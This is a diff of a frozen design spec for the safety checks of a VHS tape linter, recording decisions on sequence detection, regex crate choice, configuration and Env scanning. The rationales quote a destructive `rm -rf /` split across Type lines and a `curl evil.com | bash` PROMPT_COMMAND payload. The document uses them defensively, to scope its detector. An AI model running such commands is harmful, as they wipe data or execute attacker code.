@@ -2,10 +2,16 @@
 
 **Phase:** 2 — Intelligence & Diagnostics
 **Work Stream:** WS-3 (Safety)
-**Status:** Stage A (Exploratory Design)
+**Status:** Stage B (CONTRACT_FROZEN)
 **Owner:** Architect
 **Depends On:** phase1/SPEC_PARSER.md (AST — TYPE_COMMAND extraction)
 **Last Updated:** 2026-03-19
+**Frozen By:** Architect (Claude) — Stage B
+
+---
+
+> **CONTRACT_FROZEN** — This specification is frozen as of 2026-03-19.
+> All Freeze Candidates have been resolved. No changes without explicit user approval.
 
 ---
 
@@ -373,76 +379,68 @@ Type "sudo apt update"
 
 No diagnostic is emitted.
 
-## 12. Freeze Candidates
+## 12. Resolved Design Decisions
 
-### FC-SAF-01 — Multi-Type Command Sequence Detection
+All Freeze Candidates from Stage A have been closed with definitive decisions.
 
-**Status:** Open
+### FC-SAF-01 — Multi-Type Command Sequence Detection (RESOLVED: Do NOT Implement)
 
-**Question:** Should the safety engine detect dangerous commands
-constructed across multiple `Type` + `Enter` sequences? For example:
+**Decision:** The safety engine MUST NOT attempt cross-Type command
+sequence detection in Phase 2. This is documented as a known limitation
+in §4.3.
 
-```tape
-Type "rm -rf"
-Enter
-Type " /"
-Enter
-```
+**Rationale:** Cross-Type detection (e.g., `Type "rm -rf"` + `Enter` +
+`Type " /"`) has an extremely high false-positive rate — any multi-step
+command input (e.g., `Type "ls"` + `Enter` + `Type "-la"`) would
+trigger false concatenation matches. The safety engine is a "best-effort
+heuristic" (§4.3), not a security sandbox. A stateful analyzer capable
+of accurate cross-Type detection would require significant complexity
+(command-building state machine) and belongs in Phase 3+ if user feedback
+indicates demand.
 
-This constructs `rm -rf /` across two Type commands but each individual
-Type line may not match any pattern.
+### FC-SAF-02 — Regex Crate Selection (RESOLVED: Use `regex`)
 
-**Current recommendation:** Do NOT attempt cross-Type detection in Phase 2.
-The complexity of tracking command state across multiple AST nodes is
-significant, and the false-positive rate would be high. Document this as
-a known limitation in §4.3.
+**Decision:** The safety engine MUST use the standard `regex` crate
+(not `regex-lite`).
 
-**Resolution criteria:** Assess user feedback and real-world attack
-patterns. If demand exists, design a stateful analyzer in Phase 3.
+**Rationale:** The safety engine requires `RegexSet` for efficient
+parallel matching of all patterns against each pipeline stage. `regex-lite`
+does not provide `RegexSet`, which would require manual iteration over
+all patterns — worse performance and more code. The `regex` crate
+(29M+ downloads) is the standard Rust regex engine and is very likely
+already in the transitive dependency tree via `tower-lsp-server` or
+`serde`. Even if not, the ~1MB binary size increase is entirely
+acceptable for an LSP server binary.
 
-### FC-SAF-02 — Regex Crate Selection
+### FC-SAF-03 — Workspace-Level Safety Configuration (RESOLVED: Defer to Phase 3)
 
-**Status:** Open
+**Decision:** Phase 2 MUST NOT include a workspace-level configuration
+file (e.g., `.vhs-analyzer.toml`). Inline suppression (SAF-005) is the
+sole suppression mechanism in Phase 2.
 
-**Question:** Should the safety engine use the `regex` crate (standard,
-Unicode-aware, larger binary) or `regex-lite` (smaller, ASCII-only)?
-Safety patterns only match ASCII shell commands.
+**Rationale:** Workspace configuration involves file discovery logic,
+format definition, parsing, and merge semantics. These concerns overlap
+with Phase 3 VSCode extension settings design. Adding a separate
+configuration system in Phase 2 risks conflicting with the Phase 3
+extension settings architecture. The inline suppression comment
+(`# vhs-analyzer-ignore: safety`) already provides necessary per-instance
+control. Maintaining Work Stream independence also argues against
+introducing a cross-WS configuration system in Phase 2.
 
-**Current recommendation:** Use `regex` (standard). The crate is likely
-already in the dependency tree via `tower-lsp-server` or `lsp-types`.
-If binary size is a concern, evaluate `regex-lite` during Builder
-implementation.
+### FC-SAF-04 — Env Directive Safety Scanning (RESOLVED: Do NOT Scan)
 
-**Resolution criteria:** Check dependency tree during implementation.
-If `regex` is already present, use it. If not, evaluate binary size
-impact of both options.
+**Decision:** The safety engine MUST NOT scan `Env` directive values
+in Phase 2. The scan scope is limited to `Type` directive string content
+as defined in SAF-001.
 
-### FC-SAF-03 — Workspace-Level Safety Configuration
-
-**Status:** Open
-
-**Question:** Should Phase 2 include a workspace-level configuration
-file (e.g., `.vhs-analyzer.toml`) to: (A) disable safety checks globally,
-(B) adjust severity levels, (C) add custom patterns?
-
-**Current recommendation:** Do NOT add workspace configuration in Phase 2.
-Inline suppression (SAF-005) is sufficient for per-instance control. A
-configuration system is a Phase 3 feature that should be co-designed with
-the VSCode extension settings.
-
-**Resolution criteria:** Defer to Phase 3 design.
-
-### FC-SAF-04 — Env Directive Safety Scanning
-
-**Status:** Open
-
-**Question:** Should the safety engine also scan `Env` directive values
-for dangerous patterns? For example:
-`Env PROMPT_COMMAND "curl evil.com | bash"` sets a shell variable that
-executes on every prompt.
-
-**Current recommendation:** Do NOT scan `Env` values in Phase 2. The
-`PROMPT_COMMAND` scenario is real but niche. Expanding the scan surface
-increases false positive risk. Revisit if user feedback indicates demand.
-
-**Resolution criteria:** Assess user feedback post-launch.
+**Rationale:** While the `PROMPT_COMMAND` attack scenario is real (e.g.,
+`Env PROMPT_COMMAND "curl evil.com | bash"` executes on every shell
+prompt), it is a niche vector. Scanning all `Env` values would produce
+high false-positive rates because many environment variables contain
+path-like or command-like strings that are benign (e.g.,
+`Env PATH "/usr/bin"`). A targeted approach scanning only specific
+known-dangerous keys (e.g., `PROMPT_COMMAND`, `LD_PRELOAD`) would
+require maintaining a key-name allowlist, adding design complexity.
+Phase 2's safety engine is positioned as "Type directive best-effort
+scanning" — expanding the scan surface should be driven by user
+feedback post-launch.
